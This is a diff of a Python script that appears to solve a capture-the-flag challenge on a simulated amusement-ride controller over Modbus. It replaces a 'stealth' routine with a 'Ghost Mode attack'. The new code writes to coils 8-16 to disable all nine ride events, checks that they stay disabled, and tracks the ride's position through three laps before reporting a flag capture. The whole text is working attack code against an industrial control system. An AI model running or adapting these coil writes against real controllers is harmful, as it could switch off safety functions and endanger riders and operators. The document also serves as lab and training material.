@@ -59,72 +59,76 @@ def main():
         client.close()
         sys.exit(1)
 
-    print("\n[*] Executing stealth operations...")
+    print("\n[*] Executing Ghost Mode attack...")
+    print("[*] Disabling ALL 9 events simultaneously...")
 
-    # Action 1: Gradually change speed (avoid big jumps)
-    print("[*] Action 1: Smoothly adjusting speed...")
-    current_speed = client.read_holding_registers(0, 1)  # speed_setpoint
-    if not current_speed.isError():
-        speed = current_speed.registers[0]
-        target_speed = min(speed + 15, 100)  # Small increment
-        
-        # Ramp slowly
-        for s in range(speed, target_speed, 2):
-            client.write_register(0, s)
-            time.sleep(0.2)
-        print(f"[+] Speed ramped from {speed} to {target_speed}")
+    # Disable all 9 events (coils 8-16)
+    for event_num in range(1, 10):
+        coil_addr = 7 + event_num  # event_1_enable = coil 8, etc.
+        result = client.write_coil(coil_addr, False)
+        if result.isError():
+            print(f"[!] Failed to disable Event {event_num}")
+        else:
+            print(f"[+] Event {event_num} disabled")
+        time.sleep(0.1)
 
-    # Action 2: Briefly disable an event in a safe zone
-    print("[*] Action 2: Temporarily disabling Event 9...")
-    client.write_coil(16, False)  # event_9_enable
-    time.sleep(1)
-    client.write_coil(16, True)  # Re-enable
-    print("[+] Event 9 toggled")
+    # Verify all events are disabled
+    print("\n[*] Verifying all events are disabled...")
+    verify = client.read_coils(8, 9)
+    if not verify.isError():
+        all_disabled = all(not bit for bit in verify.bits[:9])
+        if all_disabled:
+            print("[+] All 9 events confirmed DISABLED")
+        else:
+            enabled_events = [i+1 for i, bit in enumerate(verify.bits[:9]) if bit]
+            print(f"[!] Some events still enabled: {enabled_events}")
 
-    # Action 3: Modify zone briefly
-    print("[*] Action 3: Temporarily adjusting Zone 3...")
-    client.write_coil(7, False)  # zone_3_enable
-    time.sleep(0.5)
-    client.write_coil(7, True)  # Re-enable
-    print("[+] Zone 3 toggled")
+    print("\n[*] Monitoring for 3 complete cycles...")
+    print("[*] Ride must complete 3 laps with all events disabled")
 
-    print("\n[*] Waiting for lap to complete...")
-    print("[*] Monitoring detection systems...")
-
-    # Wait for cycle to increment
-    timeout = 60
+    # Monitor position for lap counting
+    last_position = -1
+    lap_count = 0
+    timeout = 180  # 3 minutes timeout
     start_time = time.time()
 
-    while (time.time() - start_time) < timeout:
-        cycle_now = client.read_holding_registers(2051, 2)
-        alarm_now = client.read_holding_registers(1054, 1)
-        stealth_now = client.read_holding_registers(1055, 1)
+    while lap_count < 3 and (time.time() - start_time) < timeout:
+        # Read current position
+        pos_result = client.read_holding_registers(1, 1)  # current_position
+        if not pos_result.isError():
+            current_pos = pos_result.registers[0]
 
-        if not (cycle_now.isError() or alarm_now.isError() or stealth_now.isError()):
-            current_cycles = cycle_now.registers[1]
-            current_alarm = alarm_now.registers[0]
-            current_stealth = stealth_now.registers[0]
+            # Detect lap completion (position wraps from 26 back to 0)
+            if current_pos < 5 and last_position > 20:
+                lap_count += 1
+                print(f"\n[+] Lap {lap_count}/3 completed!")
 
-            print(f"\r[*] Cycles: {current_cycles} | Alarm: {current_alarm} | Stealth: {current_stealth}", 
-                  end="", flush=True)
+                # Verify events are still disabled
+                verify = client.read_coils(8, 9)
+                if not verify.isError():
+                    disabled_count = sum(1 for bit in verify.bits[:9] if not bit)
+                    print(f"[*] Events disabled: {disabled_count}/9")
 
-            # Check if lap completed
-            if current_cycles > initial_cycles:
-                print("\n\n[*] Lap completed!")
-                print(f"[*] Final alarm: {current_alarm}")
-                print(f"[*] Final stealth: {current_stealth}")
+            last_position = current_pos
 
-                if current_alarm == 0 and current_stealth == 0:
-                    print("\n[+] PERFECT STEALTH ACHIEVED!")
-                    print("[+] All modifications made without detection!")
-                    print("[*] Check the web interface for flag capture notification")
-                else:
-                    print("\n[!] Detection occurred")
-                    print(f"[!] Alarm delta: {current_alarm - initial_alarm}")
-                    print(f"[!] Stealth delta: {current_stealth - initial_stealth}")
-                break
+            # Show progress
+            print(f"\r[*] Position: {current_pos:2d} | Laps: {lap_count}/3", end="", flush=True)
 
-        time.sleep(0.5)
+        time.sleep(0.2)
+
+    if lap_count >= 3:
+        # Final verification
+        verify = client.read_coils(8, 9)
+        if not verify.isError():
+            all_disabled = all(not bit for bit in verify.bits[:9])
+            if all_disabled:
+                print("\n\n[+] GHOST MODE ACHIEVED!")
+                print("[+] Completed 3 full cycles with all events disabled!")
+                print("[*] Check the web interface for flag capture notification")
+            else:
+                print("\n\n[!] Some events were re-enabled during cycles")
+    else:
+        print("\n\n[!] Timeout - did not complete 3 cycles in time")
 
     client.close()
 
